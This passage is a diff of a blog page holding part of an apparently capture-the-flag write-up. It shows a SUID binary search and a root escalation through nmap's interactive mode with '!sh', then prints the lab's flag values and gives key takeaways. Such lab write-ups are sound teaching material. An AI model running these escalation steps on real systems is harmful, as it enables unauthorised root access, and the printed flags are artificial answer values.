+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/local/bin/nmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/pt_chown</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Nmap</strong> has the SUID bit set, which we can exploit.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">daemon@linux:/$ /usr/local/bin/nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+With root access, we can now retrieve all the flags.</li>
+</ul>
+<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag 2:"></a>Flag 2:</h3><p>Located in &#x2F;home&#x2F;robot:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> key-2-of-3.txt </span><br><span class="line">822c73956184f694993bede3eb39f959</span><br></pre></td></tr></table></figure>
+<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag 3:"></a>Flag 3:</h3><p>Located in the root directory:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> key-3-of-3.txt</span><br><span class="line">04787ddef27c3dee1ee161b21670b4e4</span><br></pre></td></tr></table></figure>
+<pre><code>                              GG!🎉 
 </code></pre>
-<p>Summary :</p>
-<p>for me , its my first time scanning UDP ports , and enumerate SNMP  so it was<br>a good experience. we learn that we need to brute force some directories<br>more and more until we find something that lead us to the target .<br>Also for the Privesca , it was good to learn about “mosh” command<br>and what used for and a Misconfiguration can lead to a root privileges.</p>
+<h2 id="Key-Takeaways"><a href="#Key-Takeaways" class="headerlink" title="Key Takeaways:"></a>Key Takeaways:</h2><p><strong><span style="color:black;">Enumeration is Key</span></strong>: Tools like Nmap and FFUF help identify attack surfaces.</p>
+<p><strong><span style="color:black;">Credentials Matter</span></strong>: Always check for hardcoded or encoded credentials in files like <strong>robots.txt</strong> or <strong>license</strong>.</p>
+<p><strong><span style="color:black;">Web Exploitation</span></strong>: Misconfigurations in web applications (e.g., WordPress) can lead to initial access.</p>
+<p><strong><span style="color:black;">privilege Escalation</span></strong>: SUID binaries are a common privilege escalation vector.<br>Always check for them.</p>
 
 </article>
     
@@ -466,12 +487,13 @@
         </h5>
     </div>
     
+    
         <div class="col-lg-6">
     <div class="trm-blog-card trm-scroll-animation">
-        <a href="/linkvortex/" class="trm-cover-frame trm-anima-link">
+        <a href="/EscapeTwo/" class="trm-cover-frame trm-anima-link">
             
             
-                <img alt="cover" class="no-fancybox" src="https://pbs.twimg.com/media/GeIZjK9XIAAd6hT.jpg">
+                <img alt="cover" class="no-fancybox" src="https://wallpapercave.com/wp/wp5134015.jpg">
             
         </a>
         
@@ -482,25 +504,24 @@
                 </a>
             </div>
             <h5>
-                <a href="/linkvortex/" class="trm-anima-link">
-                    Linkvortex
+                <a href="/EscapeTwo/" class="trm-anima-link">
+                    EscapeTwo
                 </a>
             </h5>
             <div class="trm-divider trm-mb-20 trm-mt-20"></div>
             <ul class="trm-card-data trm-label">
-                <li>24/12/27</li>
-                <li>12:58</li>
+                <li>25/01/12</li>
+                <li>16:40</li>
                 
-                    <li>1.2k</li>
+                    <li>2.4k</li>
                 
                 
-                    <li>7</li>
+                    <li>14</li>
                 
             </ul>
         </div>
     </div>
 </div>
-    
     
 </div>
 
@@ -614,8 +635,24 @@
 
             
 
+    <div id="post-toc" class="trm-post-toc">
+      <div class="trm-post-toc-header">
+        Article table of contents
+				<span id="post-toc-top">
+					TOP
+				</span>
+      </div>
+      <div class="trm-post-toc-content">
+        <ol class="trm-toc"><li class="trm-toc-item trm-toc-level-2" title="Table of Contents"><a rel="nofollow" class="trm-toc-link" href="#Table-of-Contents"><span class="trm-toc-number">1.</span> <span class="trm-toc-text">Table of Contents</span></a></li><li class="trm-toc-item trm-toc-level-2" title="Enumeration with Nmap"><a rel="nofollow" class="trm-toc-link" href="#Enumeration-with-Nmap"><span class="trm-toc-number">2.</span> <span class="trm-toc-text">Enumeration with Nmap</span></a></li><li class="trm-toc-item trm-toc-level-2" title="directories FFUF"><a rel="nofollow" class="trm-toc-link" href="#directories-FFUF"><span class="trm-toc-number">3.</span> <span class="trm-toc-text">directories FFUF</span></a></li><li class="trm-toc-item trm-toc-level-2" title="foothhold"><a rel="nofollow" class="trm-toc-link" href="#foothhold"><span class="trm-toc-number">4.</span> <span class="trm-toc-text">foothhold</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="Exploiting WordPress:"><a rel="nofollow" class="trm-toc-link" href="#Exploiting-WordPress"><span class="trm-toc-number">4.1.</span> <span class="trm-toc-text">Exploiting WordPress:</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="Privilege Escalation"><a rel="nofollow" class="trm-toc-link" href="#Privilege-Escalation"><span class="trm-toc-number">5.</span> <span class="trm-toc-text">Privilege Escalation</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="Checking for SUID Binaries:"><a rel="nofollow" class="trm-toc-link" href="#Checking-for-SUID-Binaries"><span class="trm-toc-number">5.1.</span> <span class="trm-toc-text">Checking for SUID Binaries:</span></a></li><li class="trm-toc-item trm-toc-level-3" title="Flag 2:"><a rel="nofollow" class="trm-toc-link" href="#Flag-2"><span class="trm-toc-number">5.2.</span> <span class="trm-toc-text">Flag 2:</span></a></li><li class="trm-toc-item trm-toc-level-3" title="Flag 3:"><a rel="nofollow" class="trm-toc-link" href="#Flag-3"><span class="trm-toc-number">5.3.</span> <span class="trm-toc-text">Flag 3:</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="Key Takeaways:"><a rel="nofollow" class="trm-toc-link" href="#Key-Takeaways"><span class="trm-toc-number">6.</span> <span class="trm-toc-text">Key Takeaways:</span></a></li></ol>
+      </div>
+    </div>
+
             
 <div class="trm-fixed-container">
+    
+        <div class="trm-fixed-btn post-toc-btn" data-title="Open toc">
+            <i class="iconfont fas fa-th-list"></i>
+        </div>
     
     
         <div class="trm-fixed-btn" data-title="Read Mode" onclick="asyncFun.switchReadMode()">
